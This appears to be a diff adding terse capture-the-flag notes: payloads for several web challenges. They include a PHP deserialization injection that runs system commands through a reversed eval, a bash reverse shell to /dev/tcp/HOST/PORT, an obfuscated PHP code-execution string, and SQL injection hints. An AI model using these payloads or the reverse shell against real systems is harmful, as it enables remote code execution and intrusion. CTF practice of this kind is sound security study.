@@ -1,0 +1,14 @@
+Challenge Wowooo
+?name=flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag";i:1;s:19:"V13tN4m_number_one ";}
+
+Challenge freepoint
+?ctf=O:6:"BSides":3:{s:6:"option";s:7:"getFlag";s:4:"name";s:5:"admin";s:4:"note";s:41:"eval(strrev(";))'37c6'(nib2xeh(metsys"));";}
+
+Challenge caculate
+POST /?0=bash -c "bash -i >& /dev/tcp/HOST/PORT 0>&1"
+VietNam=$C=((0/0).C)[-1],++$C,++$C,$_=$C,++$C,++$C,++$C,$C=C.$C.([].C)[1],($_.$C(120).$_.C)(${_.$C(71).$_.$C(84)}[0])
+
+Challenge baby_web and baby_web_revenge
+Bug in config nginx
+Parse php . or ] => _
+?chall.id=payload sqli
